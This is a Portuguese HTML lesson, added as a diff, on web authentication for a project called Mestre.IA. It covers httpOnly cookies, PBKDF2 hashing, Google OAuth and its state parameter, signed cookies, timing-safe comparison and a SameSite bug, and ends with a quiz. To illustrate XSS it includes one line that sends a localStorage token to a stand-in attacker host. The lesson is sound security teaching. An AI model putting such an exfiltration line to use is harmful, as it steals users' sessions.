@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Lição 9 — Sessão, cookie e token: quem guarda o quê</title>
+<link rel="stylesheet" href="../assets/curso.css">
+</head>
+<body>
+<main class="page">
+
+<p class="kicker">Lição 09 · Mestre.IA</p>
+<h1>Sessão, cookie e token — quem guarda o quê</h1>
+<p class="standfirst">HTTP não lembra de nada entre dois pedidos — cada requisição chega ao servidor como se fosse a primeira vez. Até a Etapa 8, o Mestre.IA vivia dessa amnésia: todo personagem pertencia a um <code>USUARIO_LOCAL_ID = 1</code> fixo, e a lista de heróis morava no <code>localStorage</code> do navegador. Esta lição é sobre como "lembrar quem é você" de verdade — senha, Google, e sessão — e sobre um bug que só apareceu testando no navegador de verdade, depois de o código parecer correto em todo teste automatizado e em todo <code>curl</code>.</p>
+<div class="tagline">
+  <span>~12 minutos</span>
+  <span>Arquivos: <code>app/services/auth.py</code> · <code>app/routers/auth.py</code> · <code>Frontend/src/lib/api.ts</code></span>
+  <span><a href="0008-streaming-do-servidor-ao-pixel.html">Lição 8 — streaming do servidor ao pixel ↗</a></span>
+</div>
+
+<h2>Três palavras que se confundem</h2>
+
+<p><b>Sessão</b> é um conceito, não uma coisa: "este pedido pertence à mesma pessoa que fez aquele outro pedido, dez minutos atrás". <b>Token</b> é qualquer string opaca usada como prova de alguma coisa — pode provar "eu sou o usuário 42, autenticado há pouco" (a sessão) ou "este pedido de login com Google veio realmente daqui, não de outro lugar" (o <code>state</code> do OAuth, ver mais abaixo). <b>Cookie</b> é só o mecanismo de transporte: um cabeçalho HTTP que o navegador guarda e reenvia sozinho em todo pedido para o mesmo site, sem o código do front precisar fazer nada.</p>
+
+<h2>Por que <code>localStorage</code> era o lugar errado</h2>
+
+<p>Antes da Etapa 8, a lista de heróis vivia em <code>localStorage.mestre_ia_saves</code>. Qualquer JavaScript rodando na página tem acesso de leitura e escrita a isso — inclusive script injetado por um ataque de <b>XSS</b> (Cross-Site Scripting: alguém consegue fazer seu próprio JavaScript rodar na página de outra pessoa, por exemplo através de um campo de texto mal sanitizado). Se o Mestre.IA um dia guardasse um token de sessão em <code>localStorage</code>, um XSS bem-sucedido levaria a conta inteira embora — uma linha de <code>fetch(atacante.com, {body: localStorage.getItem('token')})</code> resolve.</p>
+
+<p>Um cookie <code>httpOnly</code> fecha exatamente essa porta: <code>document.cookie</code> simplesmente não enxerga cookies marcados assim. JavaScript nunca lê, nunca escreve, nunca vaza — só o navegador manda o cookie de volta ao servidor, por fora do alcance de qualquer script.</p>
+
+<pre><code># app/routers/auth.py — login()/registrar()
+response.set_cookie(
+    key="sessao",
+    value=criar_cookie_sessao(usuario.id),
+    max_age=30 * 24 * 60 * 60,
+    httponly=True,   # invisível para JavaScript, inclusive XSS
+    samesite="lax",  # próxima seção
+)</code></pre>
+
+<h2>Senha: por que guardar o hash, e por que PBKDF2</h2>
+
+<p>Nunca se guarda a senha em texto puro — se o banco vazar (backup mal configurado, injeção de SQL, um funcionário malicioso), quem só tem os hashes não consegue reconstituir a senha original. Mas um hash rápido (SHA-256 puro, por exemplo) não basta para senha, porque humanos escolhem senhas de espaço de busca pequeno — um atacante com o banco vazado consegue testar bilhões de senhas comuns por segundo contra um hash rápido. A defesa é um hash <b>deliberadamente lento</b>, com <i>salt</i> aleatório por usuário (para dois usuários com a mesma senha não terem o mesmo hash, o que revelaria o padrão):</p>
+
+<pre><code># app/services/auth.py — hash_senha()
+_PBKDF2_ITERACOES = 260_000
+
+def hash_senha(senha: str) -> str:
+    salt = secrets.token_hex(16)
+    derivado = hashlib.pbkdf2_hmac("sha256", senha.encode(), bytes.fromhex(salt), _PBKDF2_ITERACOES)
+    return f"pbkdf2_sha256${_PBKDF2_ITERACOES}${salt}${derivado.hex()}"</code></pre>
+
+<p><b>PBKDF2</b> (Password-Based Key Derivation Function 2) é o algoritmo aqui — repete o HMAC-SHA256 260 mil vezes de propósito, para cada tentativa de senha custar um tempo mensurável de CPU em vez de nanossegundos. <code>bcrypt</code> e <code>argon2</code> são as escolhas mais comuns hoje em dia (e o que este projeto teria usado com acesso à rede para instalar uma dependência nova) — a vantagem deles sobre PBKDF2 é impor também um custo de <i>memória</i>, o que encarece ainda mais rodar bilhões de tentativas em hardware paralelo (GPU/ASIC). PBKDF2 continua aprovado pelo NIST e já vem pronto na <code>hashlib</code> da stdlib do Python — funcional, mas vale trocar se um dia isso deixar de ser um obstáculo de rede.</p>
+
+<div class="note"><b>O formato auto-descritivo</b><code>pbkdf2_sha256$260000$&lt;salt&gt;$&lt;hash&gt;</code> guarda o algoritmo e o número de iterações junto com o hash — se um dia as iterações mudarem (hardware fica mais rápido, 260 mil deixa de ser suficiente), hashes antigos continuam verificáveis, e é possível recalcular com o número novo no próximo login bem-sucedido, sem forçar reset de senha em massa. O Django usa exatamente esse padrão.</div>
+
+<h2>Login com Google: por que não decodificar o token localmente</h2>
+
+<p>O fluxo OAuth do Google (<i>authorization code flow</i>) devolve, entre outras coisas, um <code>id_token</code> — um JWT assinado pelo Google, que tecnicamente já contém o e-mail do usuário. Dá para decodificar e verificar esse JWT localmente, mas isso exige buscar (e cachear, e rotacionar) as chaves públicas do Google, e implementar verificação de assinatura RS256 corretamente — é exatamente o tipo de código onde implementações caseiras de OAuth mais erram.</p>
+
+<p>Este projeto evita esse problema perguntando <b>diretamente ao Google</b>, via uma segunda chamada HTTPS, usando o <code>access_token</code> (não o <code>id_token</code>) que veio junto:</p>
+
+<pre><code># app/services/auth.py — trocar_code_por_userinfo() (resumido)
+resp_token = httpx.post(GOOGLE_TOKEN_URL, data={"code": code, ...})
+access_token = resp_token.json()["access_token"]
+resp_userinfo = httpx.get(GOOGLE_USERINFO_URL, headers={"Authorization": f"Bearer {access_token}"})
+# resp_userinfo.json() já vem com {"sub": ..., "email": ..., "email_verified": ...}</code></pre>
+
+<p>A confiança aqui não vem de verificar uma assinatura criptográfica no seu próprio código — vem do TLS da conexão HTTPS com <code>googleapis.com</code> mesmo: só o Google poderia estar respondendo naquele endereço, então a resposta é confiável. Uma chamada de rede a mais, em troca de não reimplementar verificação de JWT.</p>
+
+<h2>O <code>state</code> do OAuth: CSRF por outro nome</h2>
+
+<p>Antes de mandar o navegador para o Google, o backend gera um valor aleatório (<code>state</code>) e devolve dois lugares com ele: na própria URL do Google (que o Google devolve intacto no <i>callback</i>) e num cookie <code>httpOnly</code> de 10 minutos. No <i>callback</i>, o backend confere que os dois batem antes de aceitar o login.</p>
+
+<p>Sem isso, um ataque possível: o atacante começa o próprio fluxo OAuth (loga na própria conta Google dele), pega a URL de <i>callback</i> que o Google gerou pra ele (com o <code>code</code> dele dentro) e convence a vítima a abrir essa URL. Se o backend não conferisse <code>state</code>, aceitaria o <code>code</code> do atacante e "logaria" a vítima na conta do atacante — um tipo de ataque chamado <b>login CSRF</b>. Conferir que o cookie (que só quem começou o fluxo <i>neste</i> navegador teria) bate com o <code>state</code> da URL fecha essa porta.</p>
+
+<h2>Um cookie "assinado" não é um cookie "criptografado"</h2>
+
+<p>O valor do cookie de sessão não é um número de usuário cru — é <code>base64url(payload) + "." + base64url(HMAC-SHA256(payload))</code>. Isso é uma <b>assinatura</b>, não criptografia: qualquer um que abra o DevTools consegue <em>ler</em> o conteúdo (é só base64, decodifica em uma linha). O que a assinatura impede é <b>forjar ou alterar</b> o conteúdo — trocar <code>usuario_id: 42</code> por <code>usuario_id: 1</code> exigiria recalcular o HMAC, e isso só é possível com o <code>SESSION_SECRET</code> do servidor, que nunca sai do backend.</p>
+
+<div class="note"><b>A distinção em uma frase</b>Assinado = "não dá para forjar, mas dá para ler". Criptografado = "não dá para ler". Uma sessão só precisa da primeira propriedade — o navegador de quem é dono do cookie já pode ver o próprio <code>usuario_id</code> mesmo, isso não é segredo.</div>
+
+<p><code>hmac.compare_digest</code>, não <code>==</code>, compara a assinatura recebida com a esperada — <code>==</code> em Python para antes na primeira diferença de byte, e o tempo que essa comparação leva vaza informação sobre quantos bytes já bateram (um <b>ataque de timing</b>: medir microssegundos de resposta para adivinhar a assinatura byte a byte). <code>compare_digest</code> sempre compara todos os bytes, no mesmo tempo, não importa onde a primeira diferença esteja. O mesmo `compare_digest` protege a comparação de senha em `verificar_senha`.</p>
+
+<h2>O bug que só o navegador de verdade revelou: <code>SameSite</code></h2>
+
+<p>Com o código pronto e todos os testes automatizados verdes, o primeiro teste manual no navegador falhou de um jeito estranho: <code>POST /auth/login</code> respondia <code>200</code>, com um <code>Set-Cookie</code> visível na aba de rede — mas o próximo <code>GET /auth/eu</code> voltava <code>401</code>, como se o cookie nunca tivesse existido. Testando a mesma sequência com <code>curl</code>, tudo funcionava perfeitamente.</p>
+
+<p>A causa: o front rodava em <code>http://localhost:5173</code> e a API em <code>http://127.0.0.1:8000</code> — dois endereços que apontam para a mesma máquina, mas que o navegador trata como <b>sites diferentes</b> para fins da política <code>SameSite</code>. O algoritmo que decide "isso é o mesmo site?" olha o domínio registrável (a parte que dá para registrar, tipo <code>exemplo.com</code>) — e trata <b>hostname</b> (<code>localhost</code>) e <b>literal de IP</b> (<code>127.0.0.1</code>) como categorias diferentes, mesmo quando um resolve para o outro. Com <code>SameSite=Lax</code>, o cookie era aceito ao ser recebido (o <code>Set-Cookie</code> do <code>127.0.0.1:8000</code> é válido para requisições àquele host), mas o navegador se recusava a <em>reenviá-lo</em> numa chamada de <code>fetch</code>/<code>axios</code> cross-site.</p>
+
+<div class="warn"><b>Por que `curl` não pegou isso</b><code>curl</code> guarda e reenvia cookies sem aplicar política nenhuma de <code>SameSite</code> — ele não é um navegador, não tem o conceito de "site" de uma página carregada. Um teste que só usa <code>curl</code> (ou <code>httpx</code> em um teste de backend, sem navegador) nunca teria pego este bug. Só apareceu ao testar no navegador de verdade — o mesmo princípio de "testar ao vivo cedo" que a Etapa 4 já tinha aprendido para chamadas de LLM (ver <code>docs/diario/0005-etapa-4.md</code>) vale igual para autenticação.</div>
+
+<p>A correção foi alinhar os dois lados no mesmo hostname — <code>VITE_API_URL=http://localhost:8000</code> em vez de <code>127.0.0.1</code> (ver <code>Frontend/.env.example</code>). Front e API viram origens diferentes (portas diferentes) mas <b>o mesmo site</b>, e <code>SameSite=Lax</code> permite cookies em requisições assim sem restrição.</p>
+
+<h2>Teste rápido</h2>
+<p>Sem olhar para cima. O objetivo aqui é lembrar, não acertar de primeira.</p>
+
+<div id="quiz"></div>
+<p class="score" id="score"></p>
+
+<div class="next">
+  <h4>Fonte primária desta lição</h4>
+  <ul>
+    <li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite">MDN — SameSite cookies</a> — a definição de "site" que causou o bug desta etapa.</li>
+    <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html">OWASP — Password Storage Cheat Sheet</a> — PBKDF2 como opção aceitável quando bcrypt/argon2 não estão disponíveis.</li>
+    <li><a href="https://developers.google.com/identity/protocols/oauth2/web-server">Google Identity — OAuth 2.0 for Web Server Applications</a> — o fluxo implementado em <code>services/auth.py</code>.</li>
+    <li><a href="../../docs/adr/0014-senha-com-google-opcional.md">ADR-0014</a> — a decisão completa, com as alternativas descartadas.</li>
+  </ul>
+  <div class="ask">Travou em algo, ou uma explicação ficou pela metade? Me pergunta — eu sou o seu professor aqui, e é melhor desentortar agora do que seguir com um modelo mental torto.</div>
+</div>
+
+</main>
+
+<script>
+const QUESTIONS = [
+ {q:"Qual a diferença essencial entre um cookie ASSINADO (como o de sessão do Mestre.IA) e um cookie CRIPTOGRAFADO?",
+  o:["Assinado impede forjar/alterar o conteúdo, mas qualquer um ainda consegue LER (é só base64); criptografado também esconde a leitura","Assinado é mais rápido de gerar, só isso","Criptografado não pode expirar; assinado pode","Não há diferença prática entre os dois"], a:0,
+  fb:"O HMAC prova que o conteúdo não foi alterado por quem não tem o SESSION_SECRET — mas o payload em si é só base64, visível a quem abrir o DevTools. Isso é aceitável porque o usuário já pode ver o próprio usuario_id."},
+
+ {q:"Por que `services/auth.py` usa `hmac.compare_digest` para comparar assinaturas e senhas, em vez do operador `==` do Python?",
+  o:["`==` para na primeira diferença de byte — o tempo de resposta vaza quantos bytes já bateram (ataque de timing); `compare_digest` sempre compara tudo, no mesmo tempo","`==` não funciona com strings em Python","`compare_digest` é só mais legível, sem diferença de segurança","`==` lançaria uma exceção com bytes de tamanhos diferentes"], a:0,
+  fb:"Um ataque de timing mede microssegundos de resposta para adivinhar o valor certo byte a byte, explorando o `==` que retorna assim que encontra a primeira diferença. `compare_digest` roda em tempo constante, não importa onde a diferença esteja."},
+
+ {q:"O bug ao vivo desta etapa: `/auth/login` respondia 200 com Set-Cookie visível, mas o `/auth/eu` seguinte voltava 401 — só no navegador, nunca no `curl`. Qual era a causa?",
+  o:["`localhost` e `127.0.0.1` contam como SITES DIFERENTES para a política SameSite (mesmo apontando pra mesma máquina) — o navegador aceitava o Set-Cookie mas recusava reenviar o cookie numa chamada cross-site; `curl` não aplica essa política","O backend não estava rodando de verdade","O CORS estava bloqueando a resposta inteira, incluindo o corpo JSON","A senha enviada estava incorreta"], a:0,
+  fb:"O algoritmo de SameSite trata hostname e literal de IP como categorias diferentes de site. Front em localhost:5173 batendo numa API em 127.0.0.1:8000 é tecnicamente cross-site — corrigido alinhando os dois em `localhost`."},
+
+ {q:"Por que `hash_senha` usa PBKDF2 com 260 mil iterações, em vez de um hash rápido como um único SHA-256?",
+  o:["Senhas têm espaço de busca pequeno (humanos escolhem senhas fracas) — um hash rápido deixaria um atacante com o banco vazado testar bilhões de senhas comuns por segundo; repetir o hash 260 mil vezes torna cada tentativa cara o bastante para isso não ser viável","260 mil iterações é uma exigência do protocolo HTTP","SHA-256 sozinho não compila em Python sem uma biblioteca externa","Mais iterações deixam o hash mais curto, economizando espaço no banco"], a:0,
+  fb:"A defesa contra senha fraca não está em esconder o algoritmo, está em tornar cada tentativa de força bruta computacionalmente cara. PBKDF2 repete o HMAC-SHA256 deliberadamente devagar; um hash rápido não ofereceria essa proteção."},
+
+ {q:"Por que o login com Google usa uma segunda chamada HTTPS (`userinfo`, com o `access_token`) em vez de decodificar e verificar o `id_token` (JWT) localmente?",
+  o:["Verificar a assinatura RS256 de um JWT exige buscar e cachear as chaves públicas do Google (JWKS) e implementar a verificação corretamente — é onde implementações caseiras de OAuth mais erram; perguntar direto ao Google via HTTPS desloca essa responsabilidade para quem já resolve isso certo","O `id_token` do Google não contém o e-mail do usuário","JWT não pode ser decodificado em Python sem uma licença paga","A chamada a `userinfo` é exigida pelos Termos de Serviço do Google, sem alternativa técnica"], a:0,
+  fb:"A confiança na resposta de `userinfo` vem do TLS da conexão HTTPS com googleapis.com — só o Google poderia estar respondendo ali. É uma chamada de rede a mais, em troca de não reimplementar verificação de assinatura JWT à mão."},
+
+ {q:"Por que o backend guarda um `state` aleatório num cookie ANTES de redirecionar para o Google, e confere se ele bate no callback?",
+  o:["Defesa contra login CSRF: sem isso, um atacante poderia pegar o `code` da PRÓPRIA conta Google dele e convencer a vítima a abrir essa URL de callback — o backend aceitaria e 'logaria' a vítima na conta do atacante","O `state` é obrigatório apenas para navegadores mobile","É uma forma de comprimir a URL de redirecionamento","Serve só para debug, não tem função de segurança"], a:0,
+  fb:"Conferir que o state da URL bate com o cookie (que só existe no navegador de quem começou o fluxo) garante que o callback pertence à mesma pessoa que iniciou o login — fecha a porta para o code de outra conta ser injetado no fluxo de alguém."},
+];
+
+let answered=0, right=0;
+const host=document.getElementById('quiz');
+QUESTIONS.forEach((item,i)=>{
+  const order=item.o.map((t,k)=>k);
+  for(let k=order.length-1;k>0;k--){const j=Math.floor(Math.random()*(k+1));[order[k],order[j]]=[order[j],order[k]];}
+  const el=document.createElement('div');
+  el.className='quiz';
+  el.innerHTML=`<p class="q">${i+1}. ${item.q}</p>
+    <div class="opts">${order.map(k=>`<button data-k="${k}">${item.o[k]}</button>`).join('')}</div>
+    <p class="fb">${item.fb}</p>`;
+  el.querySelectorAll('button').forEach(b=>{
+    b.addEventListener('click',()=>{
+      if(el.dataset.done) return;
+      el.dataset.done='1'; answered++;
+      const ok = Number(b.dataset.k)===item.a;
+      if(ok) right++;
+      el.querySelectorAll('button').forEach(x=>{
+        x.disabled=true;
+        if(Number(x.dataset.k)===item.a) x.classList.add('right');
+      });
+      if(!ok) b.classList.add('wrong');
+      el.querySelector('.fb').classList.add('on');
+      document.getElementById('score').textContent =
+        `${right} de ${answered} respondidas corretamente` +
+        (answered===QUESTIONS.length ? (right===QUESTIONS.length
+          ? " — você sabe defender essa fronteira." : " — reveja as perguntas que escaparam.") : "");
+    });
+  });
+  host.appendChild(el);
+});
+</script>
+
+</body>
+</html>
